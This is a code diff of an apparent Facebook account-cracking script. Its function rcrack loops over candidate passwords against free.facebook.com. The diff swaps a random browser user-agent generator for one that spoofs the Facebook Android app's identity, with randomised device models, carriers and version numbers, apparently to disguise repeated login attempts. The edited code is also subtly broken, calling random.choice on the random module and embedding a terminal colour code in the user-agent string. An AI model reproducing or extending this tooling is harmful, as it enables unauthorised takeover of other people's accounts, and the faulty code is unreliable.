@@ -224,21 +224,25 @@ def dynamic(text):
 ugen2=[]
 ugen=[]
  
-for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
+import random
+fban = random.choice(["FB4A"])
+facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+fbbv = str(random.randint(10000000, 66666666))
+density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
+width = random.choice(["720", "1080", "1280"])
+height = random.choice(["720", "1080", "1280", "1440", "1920"])
+#fbrv = str(random.randint(10000000, 99999999))
+fbcr = random.choice(['Nepal_Telecom', 'DOCTYPE', 'MTN-CG', 'Cellcom', 'Salaam Telecom', 'BASE'])
+#model = random.choice(self.models).rsplit('|')
+fblc = random.choice(["en_US", "en_GB", "en_PK"])
+fbbd = 'samsung'
+fbpn = random.choice(["com.facebook.katana"])
+fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
+fbmf = 'samsung'
+fbdv = random.choice(["SM-G920F", "SM-T535", "SM-T231", "SM-J320F", "GT-I9190", "GT-N7100", "SM-T561", "GT-N7100", "GT-I9500", "SM-J320F", "SM-G930F", "SM-J320F", "SM-J510FN", "GT-P5100", "SM-J320F", "SM-T531", "SPH-L720", "GT-I9500"])
+user_agent= f"\033[0;32m[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+print(user_agent)
+
     
 # APK CHECK
 def i():
@@ -297,7 +301,7 @@ def rcrack(uid,pwx,tl):
     global proxy
     try:
         for ps in pwx:
-            pro = random.choice(ugen)
+            pro = random.choice(random)
             session = requests.Session()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
